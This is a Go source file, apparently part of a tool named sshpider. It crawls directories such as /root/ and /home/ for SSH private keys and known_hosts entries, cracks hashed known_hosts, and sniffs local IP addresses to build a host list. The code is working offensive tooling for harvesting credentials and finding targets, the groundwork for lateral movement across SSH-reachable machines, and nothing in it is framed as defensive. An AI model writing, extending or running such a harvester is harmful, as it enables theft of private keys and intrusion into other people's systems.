package core

import (
	"bufio"
	"github.com/alecthomas/units"
	"github.com/koron/jvgrep/mmap"
	"github.com/paulbellamy/ratecounter"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/powerwalk"
	"io/ioutil"
	"net"
	"os"
	path2 "path"
	"strings"
	"time"
	"github.com/ip-rw/sshpider/pkg/hooks"
	"github.com/ip-rw/sshpider/pkg/knownhosts"
	"github.com/ip-rw/sshpider/pkg/search"
	"github.com/ip-rw/sshpider/pkg/structs"
)

func ReadAll(r *os.File) []byte {
	//m, err := os.Open(r.)
	//r.Seek(0, 0)
	read := bufio.NewReader(r)
	body, err := ioutil.ReadAll(read)
	if err != nil {
		logrus.WithError(err).Errorf("Error reading %s", r.Name())
		//} else {
		//	logrus.Infof("Reading %s", r.Name())
	}
	//top := len(body)
	//if len(body) > 1024 {
	//	top = 1024
	//}
	return body
}

//func IsBinary(buf []byte) bool {
//	return characterize.Detect(buf) == characterize.DATA
//}

func maybeBinary(b []byte) bool {
	l := len(b)
	if l > 10000000 {
		l = 1024
	} else if l > 1024 {
		l /= 2
	}
	for i := 0; i < l; i++ {
		if 0 < b[i] && b[i] < 0x9 {
			return true
		}
	}
	return false
}

var binary = []string{"3dm","3ds","3g2","3gp","7z","a","aac","adp","ai","aif","aiff","alz","ape","apk","appimage","ar","arj","asf","au","avi","bak","baml","bh","bin","bk","bmp","btif","bz2","bzip2","cab","caf","cgm","class","cmx","cpio","cr2","cur","dat","dcm","deb","dex","djvu","dll","dmg","dng","doc","docm","docx","dot","dotm","dra","DS_Store","dsk","dts","dtshd","dvb","dwg","dxf","ecelp4800","ecelp7470","ecelp9600","egg","eol","eot","epub","exe","f4v","fbs","fh","fla","flac","flatpak","fli","flv","fpx","fst","fvt","g3","gh","gif","graffle","gz","gzip","h261","h263","h264","icns","ico","ief","img","ipa","iso","jar","jpeg","jpg","jpgv","jpm","jxr","key","ktx","lha","lib","lvp","lz","lzh","lzma","lzo","m3u","m4a","m4v","mar","mdi","mht","mid","midi","mj2","mka","mkv","mmr","mng","mobi","mov","movie","mp3","mp4","mp4a","mpeg","mpg","mpga","mxu","nef","npx","numbers","nupkg","o","odp","ods","odt","oga","ogg","ogv","otf","ott","pages","pbm","pcx","pdb","pdf","pea","pgm","pic","png","pnm","pot","potm","potx","ppa","ppam","ppm","pps","ppsm","ppsx","ppt","pptm","pptx","psd","pya","pyc","pyo","pyv","qt","rar","ras","raw","resources","rgb","rip","rlc","rmf","rmvb","rpm","rtf","rz","s3m","s7z","scpt","sgi","shar","snap","sil","sketch","slk","smv","snk","so","stl","suo","sub","swf","tar","tbz","tbz2","tga","tgz","thmx","tif","tiff","tlz","ttc","ttf","txz","udf","uvh","uvi","uvm","uvp","uvs","uvu","viv","vob","war","wav","wax","wbmp","wdp","weba","webm","webp","whl","wim","wm","wma","wmv","wmx","woff","woff2","wrm","wvx","xbm","xif","xla","xlam","xls","xlsb","xlsm","xlsx","xlt","xltm","xltx","xm","xmind","xpi","xpm","xwd","xz","z","zip","zipx"}

func FindFiles(dirs []string) *structs.ScanResults {
	results := structs.NewScanResults()
	for _, dir := range dirs {
		powerwalk.WalkLimit(dir, func(path string, info os.FileInfo, err error) error {
			defer func() { cps.Incr(1) }()
			//matchFile := NewMatchFile(path)
			//if matchFile.IsSkippable() {
			//	return nil
			//}

			//for _, category := range AllSignatures() {
			//	for _, signature := range category {
			//		if signature.Match(matchFile) {
			//			logrus.WithFields(logrus.Fields{
			//				"path":        path,
			//				"description": signature.Description(),
			//				"comment":     signature.Comment(),
			//			}).Info("found")
			//			return nil
			//		}
			//	}
			//}

			if info == nil || !info.Mode().IsRegular() || info.Size() > int64(5*units.Megabyte) {
				return nil
			}
			lpath := strings.ToLower(path)
			for i := range binary {
				ext := path2.Ext(lpath)
				if len(ext) > 0 && binary[i] == ext[1:] {
					//logrus.WithField("file", path).Debugln("likely binary")
					return nil
				}
			}

			//if strings.Contains(lpath, "hist") || strings.Contains(lpath, ".sh") || strings.Contains(lpath, "ssh") || strings.Contains(lpath, "id_") || strings.Contains(lpath, "key") || strings.Contains(lpath, "known") {
			f, err := mmap.Open(path)
			if err != nil {
				return nil
			}
			defer f.Close()
			//body := ReadAll(f)

			//head := make([]byte, 60)
			//_, err = io.ReadFull(f, head)
			//if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
			//	logrus.WithError(err).Error("error " + f.Name())
			//	return nil
			//}
			//
			max := int64(1024)
			if f.Size() < max {
				max = f.Size()
			}
			if maybeBinary(f.Data()[:max]) {
				//logrus.WithField("file", path).Debugln("binary")
				return nil
			}

			//if strings.Contains(lpath, "hist") || strings.Contains(lpath, ".sh") {
			//if info.Size() < int64(300*units.KB) && !strings.Contains(lpath, ".pem") {
			//body := ReadAll(f)
			//	mf, err := mmap.Open(path)
			//	if err != nil {
			//		return nil
			//	}
			//	defer mf.Close()
			for _, plugin := range []hooks.Plugin{&hooks.FindKey{}, &hooks.KnownHosts{}, &hooks.TargetSearch{}} {
				if c, _ := plugin.Search(results, hooks.FileInfo{FileInfo: info, Path: path}, f.Data()); !c {
					continue
				}
			}
			//}

			//for _, signature := range CryptoFilesSignatures {
			//	if signature.Match(matchFile) {
			//			if full == nil {
			//			full = ReadAll(f)
			//		}
			return nil
		}, 200)
	}
	return results
}

func FindHosts() []*structs.Host {
	hosts := []*structs.Host{{
		Ip:   GetLocalIP(),
		Port: 22,
	}}

	sniffed := search.SniffIps()
	for i := range sniffed {
		hosts = append(hosts, sniffed[i])
	}
	return hosts
}

var cps = ratecounter.NewRateCounter(60 * time.Second)

func init() {
	go func() {
		start := time.Now()
		for {
			logrus.WithFields(logrus.Fields{"f/s": cps.Rate() / 60, "elapsed": time.Since(start)}).Warn()
			time.Sleep(5 * time.Second)
		}
	}()
}
func Scan(dirs []string) *structs.ScanResults {
	//dirs = []string{"/root/", "/home/", "/storage/nuts"}
	result := FindFiles(dirs)
	hosts := FindHosts()
	logrus.WithField("found", len(hosts)).Info("finished host enumeration")
	for _, host := range hosts {
		result.AddHost(host)
	}

	if len(result.HashedKnownHosts) > 0 {
		logrus.WithField("hashed_known_hosts", len(result.HashedKnownHosts)).Info("cracking known hosts")
		knownhosts.CrackKnownHosts(result)
	}
	logrus.WithFields(logrus.Fields{"hosts": len(result.Hosts), "known_hosts": len(result.KnownHosts), "hashed_known_hosts": len(result.HashedKnownHosts), "keys": len(result.PrivateKeys)}).Info("finished collecting")
	return result
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
